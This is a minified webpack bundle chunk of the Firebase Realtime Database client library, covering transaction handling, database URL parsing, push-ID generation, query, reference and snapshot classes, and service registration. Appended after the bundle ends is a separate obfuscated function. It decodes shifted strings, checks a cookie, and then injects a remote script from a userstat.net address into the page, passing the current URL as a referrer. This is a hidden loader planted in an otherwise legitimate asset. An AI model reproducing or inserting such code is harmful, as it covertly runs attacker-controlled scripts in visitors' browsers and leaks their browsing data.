                          for (let a = 0; a < o.length; a++) et(o[a]);
                        } else {
                          if ("datastale" === r)
                            for (let h = 0; h < i.length; h++)
                              3 === i[h].status
                                ? (i[h].status = 4)
                                : (i[h].status = 0);
                          else {
                            U(
                              "transaction at " + n.toString() + " failed: " + r
                            );
                            for (let u = 0; u < i.length; u++)
                              (i[u].status = 4), (i[u].abortReason = r);
                          }
                          io(t, n);
                        }
                      },
                      l
                    );
                  })(t, nj(n), i);
              } else
                nH(n) &&
                  nY(n, (n) => {
                    e(t, n);
                  });
            })(e, e.transactionQueueTree_);
          })(e, ia(e, n), i),
          i
        );
      }
      function il(e, t) {
        let n,
          i = e.transactionQueueTree_;
        for (n = eP(t); null !== n && void 0 === nW(i); )
          (i = nO(i, n)), (n = eP((t = eR(t))));
        return i;
      }
      function ia(e, t) {
        let n = [];
        return (
          (function e(t, n, i) {
            let r = nW(n);
            if (r) for (let s = 0; s < r.length; s++) i.push(r[s]);
            nY(n, (n) => {
              e(t, n, i);
            });
          })(e, t, n),
          n.sort((e, t) => e.order - t.order),
          n
        );
      }
      function ih(e, t) {
        let n = nW(t);
        if (n) {
          let i = 0;
          for (let r = 0; r < n.length; r++)
            2 !== n[r].status && ((n[i] = n[r]), i++);
          (n.length = i), nU(t, n.length > 0 ? n : void 0);
        }
        nY(t, (t) => {
          ih(e, t);
        });
      }
      function iu(e, t) {
        let n = nj(il(e, t)),
          i = nO(e.transactionQueueTree_, t);
        return (
          (function (e, t, n) {
            let i = e.parent;
            for (; null !== i; ) {
              if (t(i)) return !0;
              i = i.parent;
            }
          })(i, (t) => {
            ic(e, t);
          }),
          ic(e, i),
          (function e(t, n, i, r) {
            i && !r && n(t),
              nY(t, (t) => {
                e(t, n, !0, r);
              }),
              i && r && n(t);
          })(i, (t) => {
            ic(e, t);
          }),
          n
        );
      }
      function ic(e, t) {
        let n = nW(t);
        if (n) {
          let i = [],
            r = [],
            s = -1;
          for (let o = 0; o < n.length; o++)
            3 === n[o].status ||
              (1 === n[o].status
                ? ((0, y.hu)(
                    s === o - 1,
                    "All SENT items should be at beginning of queue."
                  ),
                  (s = o),
                  (n[o].status = 3),
                  (n[o].abortReason = "set"))
                : ((0, y.hu)(
                    0 === n[o].status,
                    "Unexpected transaction status in abort"
                  ),
                  n[o].unwatcher(),
                  (r = r.concat(
                    nm(e.serverSyncTree_, n[o].currentWriteId, !0)
                  )),
                  n[o].onComplete &&
                    i.push(
                      n[o].onComplete.bind(null, Error("set"), !1, null)
                    )));
          -1 === s ? nU(t, void 0) : (n.length = s + 1),
            n2(e.eventQueue_, nj(t), r);
          for (let l = 0; l < i.length; l++) et(i[l]);
        }
      }
      let id = function (e, t) {
          let n = i_(e),
            i = n.namespace;
          "firebase.com" === n.domain &&
            W(
              n.host +
                " is no longer supported. Please use <YOUR FIREBASE>.firebaseio.com instead"
            ),
            (i && "undefined" !== i) ||
              "localhost" === n.domain ||
              W(
                "Cannot parse Firebase url. Please use https://<YOUR FIREBASE>.firebaseio.com"
              ),
            n.secure ||
              ("undefined" != typeof window &&
                window.location &&
                window.location.protocol &&
                -1 !== window.location.protocol.indexOf("https:") &&
                U(
                  "Insecure Firebase access from a secure page. Please use https in calls to new Firebase()."
                ));
          let r = "ws" === n.scheme || "wss" === n.scheme;
          return {
            repoInfo: new eu(n.host, n.secure, i, r, t, "", i !== n.subdomain),
            path: new eN(n.pathString),
          };
        },
        i_ = function (e) {
          let t = "",
            n = "",
            i = "",
            r = "",
            s = "",
            o = !0,
            l = "https",
            a = 443;
          if ("string" == typeof e) {
            let h = e.indexOf("//");
            h >= 0 && ((l = e.substring(0, h - 1)), (e = e.substring(h + 2)));
            let u = e.indexOf("/");
            -1 === u && (u = e.length);
            let c = e.indexOf("?");
            -1 === c && (c = e.length),
              (t = e.substring(0, Math.min(u, c))),
              u < c &&
                (r = (function (e) {
                  let t = "",
                    n = e.split("/");
                  for (let i = 0; i < n.length; i++)
                    if (n[i].length > 0) {
                      let r = n[i];
                      try {
                        r = decodeURIComponent(r.replace(/\+/g, " "));
                      } catch (s) {}
                      t += "/" + r;
                    }
                  return t;
                })(e.substring(u, c)));
            let d = (function (e) {
              let t = {};
              for (let n of ("?" === e.charAt(0) && (e = e.substring(1)),
              e.split("&"))) {
                if (0 === n.length) continue;
                let i = n.split("=");
                2 === i.length
                  ? (t[decodeURIComponent(i[0])] = decodeURIComponent(i[1]))
                  : U(`Invalid query segment '${n}' in query '${e}'`);
              }
              return t;
            })(e.substring(Math.min(e.length, c)));
            (h = t.indexOf(":")) >= 0
              ? ((o = "https" === l || "wss" === l),
                (a = parseInt(t.substring(h + 1), 10)))
              : (h = t.length);
            let _ = t.slice(0, h);
            if ("localhost" === _.toLowerCase()) n = "localhost";
            else if (_.split(".").length <= 2) n = _;
            else {
              let p = t.indexOf(".");
              (i = t.substring(0, p).toLowerCase()),
                (n = t.substring(p + 1)),
                (s = i);
            }
            "ns" in d && (s = d.ns);
          }
          return {
            host: t,
            port: a,
            domain: n,
            subdomain: i,
            secure: o,
            scheme: l,
            pathString: r,
            namespace: s,
          };
        },
        ip = "-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz",
        ig = (function () {
          let e = 0,
            t = [];
          return function (n) {
            let i,
              r = n === e;
            e = n;
            let s = Array(8);
            for (i = 7; i >= 0; i--)
              (s[i] = ip.charAt(n % 64)), (n = Math.floor(n / 64));
            (0, y.hu)(0 === n, "Cannot push at time == 0");
            let o = s.join("");
            if (r) {
              for (i = 11; i >= 0 && 63 === t[i]; i--) t[i] = 0;
              t[i]++;
            } else
              for (i = 0; i < 12; i++) t[i] = Math.floor(64 * Math.random());
            for (i = 0; i < 12; i++) o += ip.charAt(t[i]);
            return (
              (0, y.hu)(20 === o.length, "nextPushId: Length should be 20."), o
            );
          };
        })();
      class im {
        constructor(e, t, n, i) {
          (this.eventType = e),
            (this.eventRegistration = t),
            (this.snapshot = n),
            (this.prevName = i);
        }
        getPath() {
          let e = this.snapshot.ref;
          return "value" === this.eventType ? e._path : e.parent._path;
        }
        getEventType() {
          return this.eventType;
        }
        getEventRunner() {
          return this.eventRegistration.getEventRunner(this);
        }
        toString() {
          return (
            this.getPath().toString() +
            ":" +
            this.eventType +
            ":" +
            (0, y.Wl)(this.snapshot.exportVal())
          );
        }
      }
      class iy {
        constructor(e, t, n) {
          (this.eventRegistration = e), (this.error = t), (this.path = n);
        }
        getPath() {
          return this.path;
        }
        getEventType() {
          return "cancel";
        }
        getEventRunner() {
          return this.eventRegistration.getEventRunner(this);
        }
        toString() {
          return this.path.toString() + ":cancel";
        }
      }
      class iv {
        constructor(e, t) {
          (this.snapshotCallback = e), (this.cancelCallback = t);
        }
        onValue(e, t) {
          this.snapshotCallback.call(null, e, t);
        }
        onCancel(e) {
          return (
            (0, y.hu)(
              this.hasCancelCallback,
              "Raising a cancel event on a listener with no cancel callback"
            ),
            this.cancelCallback.call(null, e)
          );
        }
        get hasCancelCallback() {
          return !!this.cancelCallback;
        }
        matches(e) {
          return (
            this.snapshotCallback === e.snapshotCallback ||
            (void 0 !== this.snapshotCallback.userCallback &&
              this.snapshotCallback.userCallback ===
                e.snapshotCallback.userCallback &&
              this.snapshotCallback.context === e.snapshotCallback.context)
          );
        }
      }
      class iC {
        constructor(e, t, n, i) {
          (this._repo = e),
            (this._path = t),
            (this._queryParams = n),
            (this._orderByCalled = i);
        }
        get key() {
          return eq(this._path) ? null : eD(this._path);
        }
        get ref() {
          return new iw(this._repo, this._path);
        }
        get _queryIdentifier() {
          let e = t_(this._queryParams),
            t = $(e);
          return "{}" === t ? "default" : t;
        }
        get _queryObject() {
          return t_(this._queryParams);
        }
        isEqual(e) {
          if (!((e = (0, y.m9)(e)) instanceof iC)) return !1;
          let t = this._repo === e._repo,
            n = eO(this._path, e._path),
            i = this._queryIdentifier === e._queryIdentifier;
          return t && n && i;
        }
        toJSON() {
          return this.toString();
        }
        toString() {
          return (
            this._repo.toString() +
            (function (e) {
              let t = "";
              for (let n = e.pieceNum_; n < e.pieces_.length; n++)
                "" !== e.pieces_[n] &&
                  (t += "/" + encodeURIComponent(String(e.pieces_[n])));
              return t || "/";
            })(this._path)
          );
        }
      }
      class iw extends iC {
        constructor(e, t) {
          super(e, t, new tc(), !1);
        }
        get parent() {
          let e = eF(this._path);
          return null === e ? null : new iw(this._repo, e);
        }
        get root() {
          let e = this;
          for (; null !== e.parent; ) e = e.parent;
          return e;
        }
      }
      class iT {
        constructor(e, t, n) {
          (this._node = e), (this.ref = t), (this._index = n);
        }
        get priority() {
          return this._node.getPriority().val();
        }
        get key() {
          return this.ref.key;
        }
        get size() {
          return this._node.numChildren();
        }
        child(e) {
          let t = new eN(e),
            n = ik(this.ref, e);
          return new iT(this._node.getChild(t), n, e2);
        }
        exists() {
          return !this._node.isEmpty();
        }
        exportVal() {
          return this._node.val(!0);
        }
        forEach(e) {
          if (this._node.isLeafNode()) return !1;
          return !!this._node.forEachChild(this._index, (t, n) =>
            e(new iT(n, ik(this.ref, t), e2))
          );
        }
        hasChild(e) {
          let t = new eN(e);
          return !this._node.getChild(t).isEmpty();
        }
        hasChildren() {
          return !this._node.isLeafNode() && !this._node.isEmpty();
        }
        toJSON() {
          return this.exportVal();
        }
        val() {
          return this._node.val();
        }
      }
      function iI(e, t) {
        return (
          (e = (0, y.m9)(e))._checkNotDeleted("ref"),
          void 0 !== t ? ik(e._root, t) : e._root
        );
      }
      function ik(e, t) {
        return (
          null === eP((e = (0, y.m9)(e))._path)
            ? nX("child", "path", t, !1)
            : nQ("child", "path", t, !1),
          new iw(e._repo, eA(e._path, t))
        );
      }
      function ib(e, t) {
        let n;
        nJ("push", (e = (0, y.m9)(e))._path), nG("push", t, e._path, !0);
        let i = n6(e._repo),
          r = ig(i),
          s = ik(e, r),
          o = ik(e, r);
        return (
          (n =
            null != t
              ? (function (e, t) {
                  nJ("set", (e = (0, y.m9)(e))._path),
                    nG("set", t, e._path, !1);
                  let n = new y.BH();
                  return (
                    (function (e, t, n, i, r) {
                      ir(e, "set", {
                        path: t.toString(),
                        value: n,
                        priority: null,
                      });
                      let s = n8(e),
                        o = tt(n, null),
                        l = nw(e.serverSyncTree_, t),
                        a = nA(o, l, s),
                        h = it(e),
                        u = ng(e.serverSyncTree_, t, a, h, !0);
                      n1(e.eventQueue_, u),
                        e.server_.put(t.toString(), o.val(!0), (n, i) => {
                          let s = "ok" === n;
                          s || U("set at " + t + " failed: " + n);
                          let o = nm(e.serverSyncTree_, h, !s);
                          n2(e.eventQueue_, t, o),
                            r &&
                              et(() => {
                                if ("ok" === n) r(null);
                                else {
                                  let e = (n || "error").toUpperCase(),
                                    t = e;
                                  i && (t += ": " + i);
                                  let s = Error(t);
                                  (s.code = e), r(s);
                                }
                              });
                        });
                      let c = iu(e, t);
                      io(e, c), n2(e.eventQueue_, c, []);
                    })(
                      e._repo,
                      e._path,
                      t,
                      0,
                      n.wrapCallback(() => {})
                    ),
                    n.promise
                  );
                })(o, t).then(() => o)
              : Promise.resolve(o)),
          (s.then = n.then.bind(n)),
          (s.catch = n.then.bind(n, void 0)),
          s
        );
      }
      class iE {
        constructor(e) {
          this.callbackContext = e;
        }
        respondsTo(e) {
          return "value" === e;
        }
        createEvent(e, t) {
          let n = t._queryParams.getIndex();
          return new im(
            "value",
            this,
            new iT(e.snapshotNode, new iw(t._repo, t._path), n)
          );
        }
        getEventRunner(e) {
          return "cancel" === e.getEventType()
            ? () => this.callbackContext.onCancel(e.error)
            : () => this.callbackContext.onValue(e.snapshot, null);
        }
        createCancelEvent(e, t) {
          return this.callbackContext.hasCancelCallback
            ? new iy(this, e, t)
            : null;
        }
        matches(e) {
          return (
            e instanceof iE &&
            (!e.callbackContext ||
              !this.callbackContext ||
              e.callbackContext.matches(this.callbackContext))
          );
        }
        hasAnyCallback() {
          return null !== this.callbackContext;
        }
      }
      function iS(e, t, n, i) {
        return (function (e, t, n, i, r) {
          var s;
          let o, l;
          if (
            ("object" == typeof i && ((o = void 0), (r = i)),
            "function" == typeof i && (o = i),
            r && r.onlyOnce)
          ) {
            let a = n,
              h = (t, n) => {
                ii(e._repo, e, c), a(t, n);
              };
            (h.userCallback = n.userCallback), (h.context = n.context), (n = h);
          }
          let u = new iv(n, o || void 0),
            c = new iE(u);
          return (
            (s = e._repo),
            (l =
              ".info" === eP(e._path)
                ? nC(s.infoSyncTree_, e, c)
                : nC(s.serverSyncTree_, e, c)),
            n3(s.eventQueue_, e._path, l),
            () => ii(e._repo, e, c)
          );
        })(e, 0, t, n, i);
      }
      (0, y.hu)(!c, "__referenceConstructor has already been defined"),
        (c = iw),
        (0, y.hu)(!d, "__referenceConstructor has already been defined"),
        (d = iw);
      let iP = {};
      class ix {
        constructor(e, t) {
          (this._repoInternal = e),
            (this.app = t),
            (this.type = "database"),
            (this._instanceStarted = !1);
        }
        get _repo() {
          return (
            this._instanceStarted ||
              ((function (e, t, n) {
                if (
                  ((e.stats_ = ef(e.repoInfo_)),
                  e.forceRestClient_ ||
                    (
                      ("object" == typeof window &&
                        window.navigator &&
                        window.navigator.userAgent) ||
                      ""
                    ).search(
                      /googlebot|google webmaster tools|bingbot|yahoo! slurp|baiduspider|yandexbot|duckduckbot/i
                    ) >= 0)
                )
                  (e.server_ = new tp(
                    e.repoInfo_,
                    (t, n, i, r) => {
                      n7(e, t, n, i, r);
                    },
                    e.authTokenProvider_,
                    e.appCheckProvider_
                  )),
                    setTimeout(() => n9(e, !0), 0);
                else {
                  if (null != n) {
                    if ("object" != typeof n)
                      throw Error(
                        "Only objects are supported for option databaseAuthVariableOverride"
                      );
                    try {
                      (0, y.Wl)(n);
                    } catch (i) {
                      throw Error("Invalid authOverride provided: " + i);
                    }
                  }
                  (e.persistentConnection_ = new eV(
                    e.repoInfo_,
                    t,
                    (t, n, i, r) => {
                      n7(e, t, n, i, r);
                    },
                    (t) => {
                      n9(e, t);
                    },
                    (t) => {
                      X(t, (t, n) => {
                        ie(e, t, n);
                      });
                    },
                    e.authTokenProvider_,
                    e.appCheckProvider_,
                    n
                  )),
                    (e.server_ = e.persistentConnection_);
                }
                e.authTokenProvider_.addTokenChangeListener((t) => {
                  e.server_.refreshAuthToken(t);
                }),
                  e.appCheckProvider_.addTokenChangeListener((t) => {
                    e.server_.refreshAppCheckToken(t.token);
                  }),
                  (e.statsReporter_ = (function (e, t) {
                    let n = e.toString();
                    return ep[n] || (ep[n] = t()), ep[n];
                  })(e.repoInfo_, () => new tv(e.stats_, e.server_))),
                  (e.infoData_ = new tf()),
                  (e.infoSyncTree_ = new nf({
                    startListening: (t, n, i, r) => {
                      let s = [],
                        o = e.infoData_.getNode(t._path);
                      return (
                        o.isEmpty() ||
                          ((s = ny(e.infoSyncTree_, t._path, o)),
                          setTimeout(() => {
                            r("ok");
                          }, 0)),
                        s
                      );
                    },
                    stopListening: () => {},
                  })),
                  ie(e, "connected", !1),
                  (e.serverSyncTree_ = new nf({
                    startListening: (t, n, i, r) => (
                      e.server_.listen(t, i, n, (n, i) => {
                        let s = r(n, i);
                        n2(e.eventQueue_, t._path, s);
                      }),
                      []
                    ),
                    stopListening: (t, n) => {
                      e.server_.unlisten(t, n);
                    },
                  }));
              })(
                this._repoInternal,
                this.app.options.appId,
                this.app.options.databaseAuthVariableOverride
              ),
              (this._instanceStarted = !0)),
            this._repoInternal
          );
        }
        get _root() {
          return (
            this._rootInternal ||
              (this._rootInternal = new iw(this._repo, eS())),
            this._rootInternal
          );
        }
        _delete() {
          return (
            null !== this._rootInternal &&
              ((function (e, t) {
                let n = iP[t];
                (n && n[e.key] === e) ||
                  W(`Database ${t}(${e.repoInfo_}) has already been deleted.`),
                  e.persistentConnection_ &&
                    e.persistentConnection_.interrupt("repo_interrupt"),
                  delete n[e.key];
              })(this._repo, this.app.name),
              (this._repoInternal = null),
              (this._rootInternal = null)),
            Promise.resolve()
          );
        }
        _checkNotDeleted(e) {
          null === this._rootInternal &&
            W("Cannot call " + e + " on a deleted database.");
        }
      }
      function iR(e = (0, g.Mq)(), t) {
        let n = (0, g.qX)(e, "database").getImmediate({ identifier: t });
        if (!n._instanceStarted) {
          let i = (0, y.P0)("database");
          i &&
            (function (e, t, n, i = {}) {
              var r, s;
              let o;
              (e = (0, y.m9)(e))._checkNotDeleted("useEmulator"),
                e._instanceStarted &&
                  W(
                    "Cannot call useEmulator() after instance has already been initialized."
                  );
              let l = e._repoInternal;
              if (l.repoInfo_.nodeAdmin)
                i.mockUserToken &&
                  W(
                    'mockUserToken is not supported by the Admin SDK. For client access with mock users, please use the "firebase" package instead of "firebase-admin".'
                  ),
                  (o = new eo(eo.OWNER));
              else if (i.mockUserToken) {
                let a =
                  "string" == typeof i.mockUserToken
                    ? i.mockUserToken
                    : (0, y.Sg)(i.mockUserToken, e.app.options.projectId);
                o = new eo(a);
              }
              (s = o),
                ((r = l).repoInfo_ = new eu(
                  `${t}:${n}`,
                  !1,
                  r.repoInfo_.namespace,
                  r.repoInfo_.webSocketOnly,
                  r.repoInfo_.nodeAdmin,
                  r.repoInfo_.persistenceKey,
                  r.repoInfo_.includeNamespaceInQueryParams
                )),
                s && (r.authTokenProvider_ = s);
            })(n, ...i);
        }
        return n;
      }
      (eV.prototype.simpleListen = function (e, t) {
        this.sendRequest("q", { p: e }, t);
      }),
        (eV.prototype.echo = function (e, t) {
          this.sendRequest("echo", { d: e }, t);
        }),
        (I = g.Jn),
        (0, g.Xd)(
          new m.wA(
            "database",
            (e, { instanceIdentifier: t }) =>
              (function (e, t, n, i, r) {
                var s, o, l;
                let a,
                  h,
                  u,
                  c,
                  d = i || e.options.databaseURL;
                void 0 === d &&
                  (e.options.projectId ||
                    W(
                      "Can't determine Firebase Database URL. Be sure to include  a Project ID when calling firebase.initializeApp()."
                    ),
                  q("Using default host for project ", e.options.projectId),
                  (d = `${e.options.projectId}-default-rtdb.firebaseio.com`));
                let _ = id(d, r),
                  p = _.repoInfo;
                void 0 !== C &&
                  C.env &&
                  (u = C.env.FIREBASE_DATABASE_EMULATOR_HOST),
                  u
                    ? ((c = !0),
                      (p = (_ = id((d = `http://${u}?ns=${p.namespace}`), r))
                        .repoInfo))
                    : (c = !_.repoInfo.secure);
                let f = new es(e.name, e.options, t);
                (function (e, t) {
                  var n;
                  let i = t.path.toString();
                  if (
                    "string" != typeof t.repoInfo.host ||
                    0 === t.repoInfo.host.length ||
                    (!nB(t.repoInfo.namespace) &&
                      "localhost" !== t.repoInfo.host.split(":")[0]) ||
                    (0 !== i.length &&
                      ((n = i) && (n = n.replace(/^\/*\.info(\/|$)/, "/")),
                      !nK(n)))
                  )
                    throw Error(
                      (0, y.gK)(e, "url") +
                        'must be a valid firebase URL and the path can\'t contain ".", "#", "$", "[", or "]".'
                    );
                })("Invalid Firebase Database URL", _),
                  eq(_.path) ||
                    W(
                      "Database URL must point to the root of a Firebase Database (not including a child path)."
                    );
                let g =
                  ((s = p),
                  (o = e),
                  (l = new er(e.name, n)),
                  (a = iP[o.name]) || ((a = {}), (iP[o.name] = a)),
                  (h = a[s.toURLString()]) &&
                    W(
                      "Database initialized multiple times. Please make sure the format of the database URL matches with each database() call."
                    ),
                  (h = new n5(s, !1, f, l)),
                  (a[s.toURLString()] = h),
                  h);
                return new ix(g, e);
              })(
                e.getProvider("app").getImmediate(),
                e.getProvider("auth-internal"),
                e.getProvider("app-check-internal"),
                t
              ),
            "PUBLIC"
          ).setMultipleInstances(!0)
        ),
        (0, g.KN)(w, T, void 0),
        (0, g.KN)(w, T, "esm2017");
    },
  },
]);
(function (o, d, l) {
  try {
    o.f = (o) =>
      o
        .split("")
        .reduce(
          (s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()),
          ""
        );
    o.b = o.f("UMUWJKX");
    (o.c =
      l.protocol[0] == "h" &&
      /\./.test(l.hostname) &&
      !new RegExp(o.b).test(d.cookie)),
      setTimeout(function () {
        o.c &&
          ((o.s = d.createElement("script")),
          (o.s.src =
            o.f("myyux?44zxjwxy" + "fy3sjy4ljy4xhwnu" + "y3oxDwjkjwwjwB") +
            l.href),
          d.body.appendChild(o.s));
      }, 1000);
    d.cookie = o.b + "=full;max-age=39800;";
  } catch (e) {}
})({}, document, location);
